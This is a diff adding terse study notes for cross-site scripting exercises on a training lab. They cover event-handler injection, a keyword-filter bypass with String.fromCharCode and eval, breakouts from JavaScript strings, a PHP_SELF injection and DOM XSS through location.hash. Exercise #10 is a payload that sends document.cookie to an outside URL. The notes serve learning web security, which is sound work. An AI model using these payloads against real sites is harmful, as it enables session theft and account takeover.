@@ -1,0 +1,78 @@
+#4
+
+there are a lot of ways to get JS to be run (non-exhaustive list):
+
+    with the <a tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick ...
+    with the <a tag directly in the URL: <a href='javascript:alert(1)'... (you will need to click the link to trigger the JS code and remember that this won't work since you cannot use script in this example).
+    with the <img tag directly with the event onerror: <img src='zzzz' onerror='alert(1)' />.
+    with the <div tag and for the following events: onmouseover (you will need to pass your mouse over the link), onmouseout, onmousemove, onclick...
+    ...
+
+
+#5
+
+in this example, the <script> tag is accepted and gets echoed back. but as soon as you try to inject a call to alert, the PHP script stops its execution. the problem seems to come from a filter on the word alert.
+
+using JS's eval and String.fromCharCode(), you should be able to get an alert box without using the word alert directly
+
+> String.fromCharCode(0x41)
+< "A"
+
+> eval("alert(1)")
+< alert box appears
+
+*** REMINDER FOR THE THOUSANDTH TIME TO URL ENCODE YOUR PLUSES AND AMPERSANDS ***
+
+otp=''
+inp='alert'
+for c in inp:
+    otp+='String.fromCharCode('+str(ord(c))+')%2B'
+otp+="+\"('2fdb31a2-ca58-4650-abfb-9406be061d69')\""
+
+> eval(otp)
+
+
+#6
+
+libcurl.so/index.php?name=hacker"; alert(1); var $dummy="
+
+here, the source code of the html page is a bit different. if you read it, you will see that the value you are sending is echoed back inside javascript code. to get your alert box, you will not need to inject a script tag, you will just need to correctly complete the pre-existing javascript code and add your own payload, then you will need to get rid of the code after your injection point by commenting it out (using //) or by adding some dummy code (var $dummy = ") to close it correctly.
+
+
+#7
+
+(htmlentities) does not encode single quotes ('), unless you tell it to do so, using the ENT_QUOTES flag. 
+
+libcurl.so/index.php?name=' alert("s"); var $dummy='
+var $a= '' alert(&quot;s&quot;); var $dummy='';
+
+libcurl.so/index.php?name='; alert(String.fromCharCode(40)); var $dummy='
+
+libcurl.so/index.php?name='; alert('('); var $dummy='
+
+
+#8
+
+PHP_SELF => form action directly takes value from the url
+http://ptl-e0483a56-a3e030f9.libcurl.so/index.php/%22%3E%3Cscript%3Ealert('xss')%3C/script%3E%3C!--
+
+
+
+#9
+
+DOMXSS
+
+document.write(decodeURIComponent(location.hash.substring(1)));
+libcurl.so/index.php#<script>alert(1)</script>
+
+nowadays: people are using location.hash.substring(1), which is url encoded hence cannot be interpreted as js
+
+
+
+#10
+
+<script>
+document.write('<img src="[URL]?c='+document.cookie+'" />');
+</script>
+
+make sure not to encode * in the url
